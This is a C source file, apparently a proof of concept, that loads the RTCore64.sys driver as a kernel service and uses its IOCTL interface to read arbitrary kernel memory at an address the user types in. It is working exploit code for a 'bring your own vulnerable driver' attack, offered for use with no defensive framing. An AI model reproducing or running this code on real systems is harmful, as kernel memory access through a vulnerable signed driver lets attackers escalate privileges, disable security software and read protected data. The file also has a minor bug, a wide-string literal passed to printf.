#include <windows.h>
#include <stdio.h>

typedef struct _RTCore64_Struct {
	BYTE Unknown[8];        // 0x0
	ULONG64 StartAddress;   // 0x8
	BYTE Unknown2[4];       // 0x10
	ULONG Offset;           // 0x14
	ULONG SizeType;         // 0x18
	ULONG Output;           // 0x1C
	BYTE Unknown3[16];      // 0x20
} RTCore64_Struct, *PRTCore64_Struct;  // Size: 0x30

BOOL LoadDriver(LPCSTR lpServiceName, LPCSTR lpDisplayName, LPCSTR lpBinaryPathName) {
	SC_HANDLE hManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
	if (!hManager) {
		printf(L"OpenSCManagerA failed with error:%lu\n", GetLastError());
		return FALSE;
	}

	printf("[+] OpenSCManagerA Success\n");

	SC_HANDLE hService = CreateServiceA(
		hManager,
		lpServiceName,
		lpDisplayName,
		SERVICE_START | DELETE | SERVICE_STOP,
		SERVICE_KERNEL_DRIVER,
		SERVICE_DEMAND_START,
		SERVICE_ERROR_NORMAL,
		lpBinaryPathName,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL
	);
	if (!hService) {
		printf("CreateServiceA failed with error:%lu\n", GetLastError());
		CloseHandle(hManager);
		return FALSE;
	}

	printf("[+] CreateServiceA Success\n");

	if (!StartServiceA(hService, 0, NULL)) {
		printf("StartServiceA failed with error:%lu\n", GetLastError());
		CloseHandle(hService);
		CloseHandle(hManager);
		return FALSE;
	}

	printf("[+] StartServiceA Success\n");

	CloseHandle(hService);
	CloseHandle(hManager);

	return TRUE;
}

BOOL BasicRead(ULONG64 StartAddress, ULONG SizeType, PULONG Output) {
	RTCore64_Struct rtcore64;
	ZeroMemory(&rtcore64, sizeof(RTCore64_Struct));
	rtcore64.StartAddress = StartAddress;
	rtcore64.SizeType = SizeType;
	// rtcore64.Output = Output;

	HANDLE hDevice = CreateFileA("\\\\.\\RTCore64", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hDevice == INVALID_HANDLE_VALUE) {
		printf("CreateFileA failed with error:%lu\n", GetLastError());
		return FALSE;
	}

	DWORD bytesReturned;

	BOOL bRet = DeviceIoControl(
		hDevice,
		0x80002048,
		&rtcore64,
		sizeof(RTCore64_Struct),
		&rtcore64,
		sizeof(RTCore64_Struct),
		&bytesReturned,
		NULL
	);
	if (!bRet) {
		printf("DeviceIoControl failed with error:%lu\n", GetLastError());
		return FALSE;
	}

	*Output = rtcore64.Output;
	return TRUE;

}

BOOL ReadKernelByte(ULONG64 StartAddress, PBYTE Output) {
	ULONG value = 0;
	if (!BasicRead(StartAddress, 1, &value)) {
		return FALSE;
	}
	// 只保留低 8 位
	*Output = (BYTE)(value & 0xFF);
	return TRUE;
}

BOOL ReadKernelWord(ULONG64 StartAddress, PWORD Output) {
	ULONG value = 0;
	if (!BasicRead(StartAddress, 2, &value)) {
		return FALSE;
	}
	// 只保留低 16 位
	*Output = (WORD)(value & 0xFFFF);
	return TRUE;
}

BOOL ReadKernelDWORD(ULONG64 StartAddress, PDWORD Output) {
	return BasicRead(StartAddress, 4, Output);
}

BOOL ReadKernelQword(ULONG64 StartAddress, PULONG64 Output) {
	ULONG low = 0;
	ULONG high = 0;
	if (!BasicRead(StartAddress, 4, &low)) {
		return FALSE;
	}
	if (!BasicRead(StartAddress + 4, 4, &high)) {
		return FALSE;
	}
	*Output = ((ULONG64)high << 32) | low;
	return TRUE;
}

int main() {
	LPCSTR lpServiceName = "RTCore64";
	LPCSTR lpDisplayName = "Dispaly RTCore64";
	LPCSTR lpBinaryPathName = "C:\\Users\\Public\\RTCore64.sys";

	if (!LoadDriver(lpServiceName, lpDisplayName, lpBinaryPathName)) {
		return -1;
	}

	printf("[+] LoadDriver Success\n");

	ULONG64 StartAddress = 0;
	ULONG Output = 0;

	printf("[+] Input Target Kernel Address: 0x");
	// 16 进制的 64 位
	scanf_s("%llx", &StartAddress);
	if (ReadKernelDWORD(StartAddress, &Output)) {
		printf("[+] Kernel Address 0x%llx value is 0x%lx\n", StartAddress, Output);
	}

	return 0;

}